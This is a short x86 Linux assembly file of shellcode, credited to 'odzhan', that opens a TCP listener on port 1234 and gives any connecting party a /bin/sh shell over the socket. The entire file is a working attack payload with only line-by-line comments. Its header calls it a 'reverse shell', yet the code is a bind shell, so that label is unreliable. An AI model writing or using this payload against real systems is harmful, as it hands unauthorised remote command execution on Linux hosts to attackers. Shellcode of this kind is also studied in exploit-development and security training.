

; 73 byte reverse shell for linux/x86
; odzhan

    bits 32
    
start:
    xor    ebx, ebx          ; ebx=0
    mul    ebx               ; eax=0, edx=0
    ; step 1, create a socket
    mov    al, 0x66          ; eax=sys_socketcall
    inc    ebx               ; 
    push   edx               ; args.protocol = IPPROTO_IP
    push   ebx               ; args.type     = SOCK_STREAM
    push   2                 ; args.family   = AF_INET
    mov    ecx, esp          ; ecx=&args
    int    0x80
    
    ; step 2, bind to port 1234
    pop    ebx               ; ebx=2, sys_bind
    pop    esi               ; esi=1
    push   edx               ; sa.sin_addr = INADDR_ANY
    push   word 0xD204       ; sa.sin_port = htons(1234)
    push   0x10              ; sizeof(sa)
    push   ecx               ; &sa
    push   eax               ; sockfd
    mov    al, 0x66          ; eax=sys_socketcall
    mov    ecx, esp          ; ecx=&args
    int    0x80
    
    mov    [ecx+4], edx      ; clear sa from args
    
    ; step 3, listen for incoming connections
    mov    al, 0x66          ; eax=sys_socketcall
    mov    bl, 4             ; ebx=sys_listen
    int    0x80
    
    ; step 4, accept connections
    mov    al, 0x66          ; eax=sys_socketcall
    inc    ebx               ; ebx=sys_accept
    int    0x80
    
    ; step 5, assign socket to stdin, stdout and stderr
    pop    ecx               ; ecx=2
    xchg   ebx, eax          ; ebx=sockfd
dup_loop:
    push   0x3f
    pop    eax               ; eax=sys_dup2
    int    0x80
    dec    ecx
    jns    dup_loop
    
    ; step 6, execute /bin//sh
    mov    al, 0xb           ; eax=sys_execve
    push   0x68732f2f	       ; "hs//"
    push   0x6e69622f	       ; "nib/"
    mov    ebx, esp          ; ebx="/bin//sh", 0
    inc    ecx               ; ecx=0 argv=0
    int    0x80              ; exec sys_execve
    
    
